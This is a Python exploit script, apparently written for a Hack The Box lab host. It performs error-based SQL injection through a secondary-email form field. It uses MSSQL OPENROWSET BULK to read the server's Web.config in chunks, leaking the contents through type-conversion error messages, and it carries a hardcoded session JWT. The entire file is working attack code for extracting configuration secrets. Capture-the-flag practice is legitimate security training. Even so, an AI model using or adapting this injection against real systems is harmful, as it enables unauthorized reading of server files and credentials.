#!/usr/bin/env python3  
import requests  
import re  
import html  
import time  
import warnings  
  
warnings.filterwarnings('ignore', message='Unverified HTTPS request')  
  
URL = "https://vault.royalflush.htb/My/SecondaryEmail"  
HEADERS = {  
    "Host": "vault.royalflush.htb",  
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",  
    "Accept": "*/*",  
    "Accept-Language": "en-US,en;q=0.9",  
    "Accept-Encoding": "gzip, deflate, br",  
    "Content-Type": "application/x-www-form-urlencoded",  
    "Origin": "https://vault.royalflush.htb",  
    "Referer": "https://vault.royalflush.htb/My/Settings",  
    "Sec-Fetch-Dest": "document",  
    "Sec-Fetch-Mode": "navigate",  
    "Sec-Fetch-Site": "same-origin",  
}  
COOKIE = {  
    "user": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiamRvdmVyNjZAcm95YWxmbHVzaC5odGIiLCJleHAiOjE3ODY0MjYxMjIsImlzcyI6InZhdWx0LnJveWFsZmx1c2guaHRiIiwiYXVkIjoidmF1bHQucm95YWxmbHVzaC5odGIifQ.OVst7_SNQzuMHiCDXpXJx3oMqUdfiI5UtPPSI-tVbds"  
}  
  
  
def get_chunk(start, length):  
    q = f"SELECT+SUBSTRING(BulkColumn,{start},{length})+FROM+OPENROWSET(BULK+'C:/inetpub/wwwroot/vault.royalflush.htb/Web.config',+SINGLE_CLOB)+AS+x"  
    body = f"secondaryEmail=asd@me.com'+UNION+SELECT+NULL,NULL,NULL,CAST(({q})+AS+int);--+"  
    r = requests.post(URL, headers=HEADERS, cookies=COOKIE, data=body, verify=False, timeout=30)  
    m = re.search(r"Conversion failed when converting the (?:n)?varchar value '([^']*?)' to data type int", r.text, re.DOTALL)  
    if m:  
        return html.unescape(m.group(1).replace("<br>", "\n").replace("&nbsp;", " "))  
    if r.status_code == 302:  
        return None  
    title = re.search(r"<title>([^<]+)</title>", r.text)  
    return f"[HTTP {r.status_code}] {title.group(1) if title else 'no title'}"  
  
  
if __name__ == "__main__":  
    out = ""  
    step = 200  
    for i in range(1, 10001, step):  
        chunk = get_chunk(i, step)  
        if chunk is None:  
            print(f"[END] redirect at {i}")  
            break  
        if chunk.startswith("["):  
            print(f"[ERR] at {i}: {chunk[:200]}")  
            break  
        if not chunk:  
            print(f"[END] empty chunk at {i}")  
            break  
        out += chunk  
        print(f"[{i:5d}-{i+step-1:5d}] {len(chunk):3d} chars")  
        time.sleep(0.2)  
    with open("/tmp/Web.config", "w", encoding="utf-8", errors="ignore") as f:  
        f.write(out)  
    print(f"\n[*] Dumped {len(out)} chars to /tmp/Web.config")  
    print(out)